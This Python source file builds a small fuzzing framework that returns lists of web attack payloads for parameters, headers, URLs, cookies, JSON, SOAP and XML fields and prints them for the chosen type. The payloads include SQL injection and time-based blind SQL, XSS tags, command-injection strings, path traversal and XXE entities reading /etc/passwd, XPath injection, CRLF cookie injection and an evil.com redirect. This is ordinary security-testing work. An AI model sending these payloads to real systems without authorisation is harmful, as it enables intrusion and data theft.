"""
Author: Daethyra <109057945+Daethyra@users.noreply.github.com>

Purpose:
    Create a framework for generating fuzz data for different types of input fields.
"""

from abc import ABC, abstractmethod


class InputField(ABC):
    @abstractmethod
    def generate_fuzz_data(self):
        """
        Generate fuzz data for the input field.

        This method is an abstract method that must be implemented by subclasses.
        It is responsible for generating fuzz data for the input field.

        Returns:
            A list of strings representing the fuzz data.
        """
        pass


class ParameterField(InputField):
    def generate_fuzz_data(self):
        return [
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "& echo 'Injected'",
            "A" * 1000,
            "1 AND SLEEP(5)",  # Blind SQL
            " UNION SELECT NULL,NULL--",
            "%27%20AND%20%27x%27%3D%27x",  # URL-encoded
        ]


class HeaderField(InputField):
    def generate_fuzz_data(self):
        return [
            "Injected-Header: InjectedValue",
            "<script>alert('XSS')</script>",
            "' OR '1'='1",
            "& echo 'Injected'",
            "' AND SLEEP(5)",  # Blind SQL
            "Content-Type: application/json",
        ]


class URLField(InputField):
    def generate_fuzz_data(self):
        return [
            "../../../etc/passwd",
            "\"><script>alert('XSS')</script>",
            "product?id=' OR '1'='1",
            "redirect?url=http://evil.com",
            "product?id=1 AND SLEEP(5)",  # Blind SQL
            "?q=test%0aSet-Cookie:%20sessionId=malicious",
        ]


class CookieField(InputField):
    def generate_fuzz_data(self):
        return [
            "<script>alert('XSS')</script>",
            "' OR '1'='1",
            "| echo 'Injected'",
            "A" * 1000,
            "1 AND SLEEP(5)",  # Blind SQL
            "malicious_cookie_value",
        ]


class JSONField(InputField):
    def generate_fuzz_data(self):
        return [
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "| echo 'Injected'",
            "A" * 1000,
            "1 AND SLEEP(5)",  # Blind SQL
            '{"test": "malicious"}',
        ]


class SOAPField(InputField):
    def generate_fuzz_data(self):
        return [
            '"><injected></>',
            "<![CDATA[<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>]]>",
            "| echo 'Injected'",
            "' OR '1'='1'",
            "1 AND SLEEP(5)",  # Blind SQL
            "<extra>malicious</extra>",
        ]


class XMLField(InputField):
    def generate_fuzz_data(self):
        return [
            "&lt;injected&gt;",
            "<![CDATA[<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>]]>",
            "/user[name/text() = 'admin' or '1'='1']/password",
            "A" * 1000,
            "1 AND SLEEP(5)",  # Blind SQL
            "<extra>malicious</extra>",
        ]


class InputFieldFactory:
    """
    Creates an instance of the appropriate InputField subclass based on the given field_type.

    :param field_type: A string representing the type of input field.
    :type field_type: str

    :return: An instance of the InputField subclass corresponding to the given field_type.
    :rtype: InputField

    :raises ValueError: If the given field_type is not recognized.
    """

    @staticmethod
    def create_input_field(field_type):
        if field_type == "parameter":
            return ParameterField()
        elif field_type == "header":
            return HeaderField()
        elif field_type == "url":
            return URLField()
        elif field_type == "cookie":
            return CookieField()
        elif field_type == "json":
            return JSONField()
        elif field_type == "soap":
            return SOAPField()
        elif field_type == "xml":
            return XMLField()
        else:
            raise ValueError("Unknown field type")


def main():
    # Example input fields
    # input_fields = [
    #     ('parameter', 'username'),
    #     ('header', 'User-Agent'),
    #     ('url', 'product'),
    #     ('cookie', 'sessionid'),
    #     ('json', 'email'),
    #     ('soap', 'item'),
    #     ('xml', 'value')
    # ]

    # Example input from the user
    field_type = (
        input(
            "Enter the type of input field (parameter, header, url, cookie, json, soap, xml): "
        )
        .strip()
        .lower()
    )

    factory = InputFieldFactory()
    input_field = factory.create_input_field(field_type)
    fuzz_data = input_field.generate_fuzz_data()

    print(f"""------------------\nFuzz data for {field_type}: """)
    for data in fuzz_data:
        print(f"\n{data}")


if __name__ == "__main__":
    main()
